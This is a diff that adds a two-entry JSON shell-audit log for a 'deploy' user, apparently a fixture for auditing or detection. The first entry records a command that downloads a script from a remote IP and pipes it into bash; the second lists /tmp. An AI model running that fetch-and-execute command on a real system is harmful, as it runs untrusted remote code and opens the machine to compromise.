@@ -1,0 +1,14 @@
+[
+  {
+    "command": "curl -s http://198.51.100.7/x.sh | bash",
+    "source": "shell-audit",
+    "timestamp": "2025-10-14T03:15:10Z",
+    "user": "deploy"
+  },
+  {
+    "command": "ls -la /tmp",
+    "source": "shell-audit",
+    "timestamp": "2025-10-14T03:16:00Z",
+    "user": "deploy"
+  }
+]
